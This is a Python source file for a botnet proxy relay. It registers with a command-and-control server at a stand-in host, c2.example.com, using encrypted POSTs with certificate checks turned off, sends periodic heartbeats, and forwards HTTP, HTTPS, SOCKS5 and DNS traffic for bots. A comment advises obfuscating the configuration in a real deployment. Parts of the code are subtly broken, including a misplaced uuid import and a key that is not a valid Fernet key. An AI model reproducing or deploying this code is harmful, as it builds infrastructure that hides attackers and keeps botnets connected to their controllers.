# proxy_server.py
import socket
import threading
import ssl
import json
import base64
import time
import random
import requests
from cryptography.fernet import Fernet
import dns.resolver
import socks

class ProxyServer:
    def __init__(self, c2_server, encryption_key, listen_port=8080):
        self.c2_server = c2_server
        self.encryption_key = encryption_key
        self.cipher_suite = Fernet(encryption_key)
        self.listen_port = listen_port
        self.is_running = True
        self.registered = False
        self.proxy_id = str(uuid.uuid4())
        self.last_heartbeat = 0
        
    def register_with_c2(self):
        """Register proxy with C2 server"""
        registration_data = {
            'proxy_id': self.proxy_id,
            'type': 'proxy',
            'port': self.listen_port,
            'capabilities': ['http', 'https', 'socks5', 'dns']
        }
        
        encrypted_data = self.cipher_suite.encrypt(json.dumps(registration_data).encode()).decode()
        
        try:
            url = f"https://{self.c2_server}/register_proxy"
            response = requests.post(url, data=encrypted_data, timeout=10, verify=False)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    print(f"Successfully registered proxy with C2 server")
                    self.registered = True
                    return True
        except Exception as e:
            print(f"Failed to register proxy with C2 server: {e}")
            
        return False
    
    def send_heartbeat(self):
        """Send heartbeat to C2 server"""
        if not self.registered:
            return
            
        try:
            heartbeat_data = {
                'proxy_id': self.proxy_id,
                'timestamp': int(time.time())
            }
            
            encrypted_data = self.cipher_suite.encrypt(json.dumps(heartbeat_data).encode()).decode()
            
            url = f"https://{self.c2_server}/proxy_heartbeat"
            response = requests.post(url, data=encrypted_data, timeout=10, verify=False)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'success':
                    self.last_heartbeat = int(time.time())
                    return True
        except Exception as e:
            print(f"Failed to send heartbeat to C2 server: {e}")
            
        return False
    
    def handle_http_request(self, client_socket, client_address):
        """Handle HTTP request from bot"""
        try:
            # Receive request
            request = b''
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                request += data
                
                # Check if we have the complete request
                if b'\r\n\r\n' in request:
                    break
            
            if not request:
                client_socket.close()
                return
            
            # Parse request
            request_str = request.decode('utf-8', errors='ignore')
            lines = request_str.split('\r\n')
            
            if len(lines) < 1:
                client_socket.close()
                return
                
            # Extract method and URL
            method, url, version = lines[0].split(' ')
            
            # Extract headers
            headers = {}
            for line in lines[1:]:
                if line.strip() == '':
                    break
                key, value = line.split(':', 1)
                headers[key.strip()] = value.strip()
            
            # Extract body if present
            body = b''
            if b'\r\n\r\n' in request:
                body = request.split(b'\r\n\r\n', 1)[1]
            
            # Forward request to C2 server
            try:
                if method.upper() == 'GET':
                    response = requests.get(url, headers=headers, timeout=30, verify=False)
                elif method.upper() == 'POST':
                    response = requests.post(url, headers=headers, data=body, timeout=30, verify=False)
                elif method.upper() == 'PUT':
                    response = requests.put(url, headers=headers, data=body, timeout=30, verify=False)
                elif method.upper() == 'DELETE':
                    response = requests.delete(url, headers=headers, timeout=30, verify=False)
                else:
                    response = requests.request(method, url, headers=headers, data=body, timeout=30, verify=False)
                
                # Send response back to client
                response_headers = f"HTTP/1.1 {response.status_code} {response.reason}\r\n"
                for key, value in response.headers.items():
                    response_headers += f"{key}: {value}\r\n"
                response_headers += "\r\n"
                
                client_socket.send(response_headers.encode())
                client_socket.send(response.content)
                
            except Exception as e:
                print(f"Error forwarding request: {e}")
                error_response = f"HTTP/1.1 500 Internal Server Error\r\n\r\nError: {str(e)}"
                client_socket.send(error_response.encode())
                
        except Exception as e:
            print(f"Error handling HTTP request: {e}")
        finally:
            client_socket.close()
    
    def handle_https_request(self, client_socket, client_address):
        """Handle HTTPS request from bot"""
        try:
            # Receive CONNECT request
            request = b''
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                request += data
                
                # Check if we have the complete request
                if b'\r\n\r\n' in request:
                    break
            
            if not request:
                client_socket.close()
                return
            
            # Parse CONNECT request
            request_str = request.decode('utf-8', errors='ignore')
            lines = request_str.split('\r\n')
            
            if len(lines) < 1:
                client_socket.close()
                return
                
            # Extract method and target
            method, target, version = lines[0].split(' ')
            
            if method.upper() != 'CONNECT':
                client_socket.close()
                return
                
            # Extract host and port
            if ':' in target:
                host, port = target.split(':')
                port = int(port)
            else:
                host = target
                port = 443
            
            # Connect to target
            try:
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_socket.settimeout(30)
                target_socket.connect((host, port))
                
                # Send success response to client
                success_response = f"HTTP/1.1 200 Connection Established\r\n\r\n"
                client_socket.send(success_response.encode())
                
                # Start bidirectional forwarding
                def forward(source, destination):
                    try:
                        while True:
                            data = source.recv(4096)
                            if not data:
                                break
                            destination.send(data)
                    except:
                        pass
                
                # Start forwarding threads
                client_to_target = threading.Thread(target=forward, args=(client_socket, target_socket))
                target_to_client = threading.Thread(target=forward, args=(target_socket, client_socket))
                
                client_to_target.daemon = True
                target_to_client.daemon = True
                
                client_to_target.start()
                target_to_client.start()
                
                # Wait for threads to complete
                client_to_target.join()
                target_to_client.join()
                
            except Exception as e:
                print(f"Error connecting to target {host}:{port}: {e}")
                error_response = f"HTTP/1.1 502 Bad Gateway\r\n\r\nError: {str(e)}"
                client_socket.send(error_response.encode())
                
        except Exception as e:
            print(f"Error handling HTTPS request: {e}")
        finally:
            client_socket.close()
    
    def handle_socks5_request(self, client_socket, client_address):
        """Handle SOCKS5 request from bot"""
        try:
            # Receive SOCKS5 handshake
            data = client_socket.recv(2)
            if len(data) < 2 or data[0] != 0x05:
                client_socket.close()
                return
                
            # Read authentication methods
            auth_method_count = data[1]
            auth_methods = client_socket.recv(auth_method_count)
            
            # Respond with no authentication
            client_socket.send(b'\x05\x00')
            
            # Receive SOCKS5 request
            data = client_socket.recv(4)
            if len(data) < 4 or data[0] != 0x05:
                client_socket.close()
                return
                
            # Parse request
            cmd = data[1]
            addr_type = data[3]
            
            # Parse address
            if addr_type == 0x01:  # IPv4
                addr_data = client_socket.recv(4)
                if len(addr_data) < 4:
                    client_socket.close()
                    return
                addr = socket.inet_ntoa(addr_data)
            elif addr_type == 0x03:  # Domain name
                addr_len = client_socket.recv(1)[0]
                addr_data = client_socket.recv(addr_len)
                if len(addr_data) < addr_len:
                    client_socket.close()
                    return
                addr = addr_data.decode('utf-8')
            elif addr_type == 0x04:  # IPv6
                addr_data = client_socket.recv(16)
                if len(addr_data) < 16:
                    client_socket.close()
                    return
                addr = socket.inet_ntop(socket.AF_INET6, addr_data)
            else:
                client_socket.close()
                return
            
            # Parse port
            port_data = client_socket.recv(2)
            if len(port_data) < 2:
                client_socket.close()
                return
            port = (port_data[0] << 8) | port_data[1]
            
            # Connect to target
            try:
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_socket.settimeout(30)
                target_socket.connect((addr, port))
                
                # Send success response
                response = b'\x05\x00\x00\x01' + socket.inet_aton('0.0.0.0') + port_data
                client_socket.send(response)
                
                # Start bidirectional forwarding
                def forward(source, destination):
                    try:
                        while True:
                            data = source.recv(4096)
                            if not data:
                                break
                            destination.send(data)
                    except:
                        pass
                
                # Start forwarding threads
                client_to_target = threading.Thread(target=forward, args=(client_socket, target_socket))
                target_to_client = threading.Thread(target=forward, args=(target_socket, client_socket))
                
                client_to_target.daemon = True
                target_to_client.daemon = True
                
                client_to_target.start()
                target_to_client.start()
                
                # Wait for threads to complete
                client_to_target.join()
                target_to_client.join()
                
            except Exception as e:
                print(f"Error connecting to target {addr}:{port}: {e}")
                # Send failure response
                response = b'\x05\x04\x00\x01' + socket.inet_aton('0.0.0.0') + port_data
                client_socket.send(response)
                
        except Exception as e:
            print(f"Error handling SOCKS5 request: {e}")
        finally:
            client_socket.close()
    
    def handle_dns_request(self, client_socket, client_address):
        """Handle DNS request from bot"""
        try:
            # Receive DNS request
            data = client_socket.recv(1024)
            if len(data) < 12:
                client_socket.close()
                return
            
            # Parse DNS header
            header = data[:12]
            txid = header[0:2]
            flags = header[2:4]
            qdcount = int.from_bytes(header[4:6], byteorder='big')
            ancount = int.from_bytes(header[6:8], byteorder='big')
            nscount = int.from_bytes(header[8:10], byteorder='big')
            arcount = int.from_bytes(header[10:12], byteorder='big')
            
            # Parse questions
            questions = []
            offset = 12
            
            for _ in range(qdcount):
                # Parse domain name
                domain_parts = []
                while True:
                    length = data[offset]
                    if length == 0:
                        offset += 1
                        break
                    offset += 1
                    domain_parts.append(data[offset:offset+length].decode('utf-8'))
                    offset += length
                
                domain = '.'.join(domain_parts)
                
                # Parse type and class
                qtype = int.from_bytes(data[offset:offset+2], byteorder='big')
                qclass = int.from_bytes(data[offset+2:offset+4], byteorder='big')
                offset += 4
                
                questions.append({
                    'domain': domain,
                    'type': qtype,
                    'class': qclass
                })
            
            # Resolve DNS queries
            resolver = dns.resolver.Resolver()
            response = bytearray(data)
            
            # Modify flags to indicate response
            response[2] |= 0x80  # QR bit
            
            # Set answer count
            answer_count = 0
            answer_offset = offset
            
            for question in questions:
                try:
                    # Resolve query
                    if question['type'] == 1:  # A record
                        answers = resolver.resolve(question['domain'], 'A')
                        for answer in answers:
                            # Add answer to response
                            answer_count += 1
                            
                            # Add domain name (pointer to question)
                            response.extend(b'\xc0\x0c')  # Pointer to question domain
                            
                            # Add type, class, TTL, and length
                            response.extend(int.to_bytes(question['type'], 2, byteorder='big'))
                            response.extend(int.to_bytes(question['class'], 2, byteorder='big'))
                            response.extend(int.to_bytes(300, 4, byteorder='big'))  # TTL
                            response.extend(int.to_bytes(4, 2, byteorder='big'))  # Length
                            
                            # Add IP address
                            response.extend(socket.inet_aton(str(answer)))
                    elif question['type'] == 28:  # AAAA record
                        answers = resolver.resolve(question['domain'], 'AAAA')
                        for answer in answers:
                            # Add answer to response
                            answer_count += 1
                            
                            # Add domain name (pointer to question)
                            response.extend(b'\xc0\x0c')  # Pointer to question domain
                            
                            # Add type, class, TTL, and length
                            response.extend(int.to_bytes(question['type'], 2, byteorder='big'))
                            response.extend(int.to_bytes(question['class'], 2, byteorder='big'))
                            response.extend(int.to_bytes(300, 4, byteorder='big'))  # TTL
                            response.extend(int.to_bytes(16, 2, byteorder='big'))  # Length
                            
                            # Add IPv6 address
                            response.extend(socket.inet_pton(socket.AF_INET6, str(answer)))
                except:
                    pass
            
            # Update answer count in header
            response[6:8] = int.to_bytes(answer_count, 2, byteorder='big')
            
            # Send response
            client_socket.send(response)
            
        except Exception as e:
            print(f"Error handling DNS request: {e}")
        finally:
            client_socket.close()
    
    def start_server(self):
        """Start proxy server"""
        # Register with C2 server
        if not self.register_with_c2():
            print("Failed to register proxy with C2 server")
            return
        
        # Create server socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(('0.0.0.0', self.listen_port))
        server_socket.listen(100)
        
        print(f"Proxy server listening on port {self.listen_port}")
        
        # Start heartbeat thread
        def heartbeat_thread():
            while self.is_running:
                self.send_heartbeat()
                time.sleep(30)
        
        heartbeat_thread_obj = threading.Thread(target=heartbeat_thread)
        heartbeat_thread_obj.daemon = True
        heartbeat_thread_obj.start()
        
        # Accept connections
        while self.is_running:
            try:
                client_socket, client_address = server_socket.accept()
                
                # Peek at the first few bytes to determine protocol
                client_socket.settimeout(5)
                try:
                    data = client_socket.recv(3, socket.MSG_PEEK)
                    
                    if len(data) >= 3:
                        if data[0] == 0x05 and data[1] == 0x01:  # SOCKS5
                            thread = threading.Thread(target=self.handle_socks5_request, args=(client_socket, client_address))
                        elif data.startswith(b'GET') or data.startswith(b'POST') or data.startswith(b'PUT') or data.startswith(b'DELETE'):  # HTTP
                            thread = threading.Thread(target=self.handle_http_request, args=(client_socket, client_address))
                        elif data.startswith(b'CONNECT'):  # HTTPS
                            thread = threading.Thread(target=self.handle_https_request, args=(client_socket, client_address))
                        else:  # Assume DNS
                            thread = threading.Thread(target=self.handle_dns_request, args=(client_socket, client_address))
                        
                        thread.daemon = True
                        thread.start()
                    else:
                        client_socket.close()
                except socket.timeout:
                    client_socket.close()
                    
            except KeyboardInterrupt:
                self.is_running = False
            except Exception as e:
                print(f"Error accepting connection: {e}")
                time.sleep(1)
        
        # Cleanup
        server_socket.close()

# Main execution
if __name__ == "__main__":
    import uuid
    
    # Configuration (should be obfuscated in real implementation)
    c2_server = "c2.example.com"
    listen_port = 8080
    
    # Encryption key (should be derived from a secure source in real implementation)
    encryption_key = b'gAAAAABhZ3k2eJ7X8YvW9zL5pN1mQ0oR7uT4vW6xI8jK3lM2nO5pQ7rS9tU2wY4zA6cV8bN1dF3gH5jK7lM9oP0qR2sT4uV6wX8yZ0aB2cD4eF6gH8jK'
    
    # Create and run proxy server
    proxy = ProxyServer(c2_server, encryption_key, listen_port)
    proxy.start_server()
